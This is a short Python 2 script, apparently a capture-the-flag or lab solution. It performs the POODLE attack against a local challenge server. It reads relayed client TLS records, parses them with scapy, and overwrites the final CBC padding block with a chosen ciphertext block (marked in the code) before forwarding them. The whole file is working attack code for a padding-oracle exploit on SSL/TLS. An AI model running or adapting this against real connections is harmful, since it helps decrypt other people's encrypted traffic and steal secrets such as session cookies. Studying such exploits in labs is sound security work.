#!/usr/bin/env python

import socket
import sys
import scapy.all as scapy
sys.path.append("scapy-ssl_tls/src/scapy/layers")
from ssl_tls import *

CHALLENGE_ENDPOINT = ("localhost", 4747)
ORIGIN_CLIENT = "C"
ORIGIN_SEPARATOR = "-"

BLOCK_LENGTH = 16;

TLS_CONTENT_TYPE_APPLICATION_DATA = dict(((v, k) for k, v in TLS_CONTENT_TYPES.iteritems()))["application_data"]

s = socket.create_connection(CHALLENGE_ENDPOINT)
f = s.makefile(bufsize=0)
f.write('post("/aaaaaaaaaa", "");\n')

l = f.readline()
while l:
	tls_record = None
	splitted = l.split(ORIGIN_SEPARATOR, 1)
	if len(splitted) > 1:
		origin, encoded_data = splitted
		if origin == ORIGIN_CLIENT:
			data = encoded_data.decode("base64")
			tls_record = TLSRecord(data)
			if tls_record.content_type == TLS_CONTENT_TYPE_APPLICATION_DATA:
				encrypted_blocks = tls_record.length / BLOCK_LENGTH
				if len(tls_record.load) > tls_record.length:
					load_excess = tls_record.load[tls_record.length:]
					tls_record.load = tls_record.load[:tls_record.length]
					second_tls_record = TLSRecord(load_excess)
					tls_record = tls_record/second_tls_record
					encrypted_blocks = second_tls_record.length / BLOCK_LENGTH
				#print encrypted_blocks
				#print origin, tls_record.show()
				# <POODLE>
				data_minus_last_block = data[:-BLOCK_LENGTH]
				first_block = data[-BLOCK_LENGTH*encrypted_blocks:-BLOCK_LENGTH*(encrypted_blocks-1)]
				data = data_minus_last_block + first_block
				l = origin + ORIGIN_SEPARATOR + data.encode("base64").replace("\n", "") + "\n"
				# </POODLE>
				#tls_record = TLSRecord(data)
				#load_excess = tls_record.load[tls_record.length:]
				#tls_record.load = tls_record.load[:tls_record.length]
				#tls_record = tls_record/TLSRecord(load_excess)
				#print tls_record.show()
		f.write(l)
	else:
		print l
	l = f.readline()

print "END"
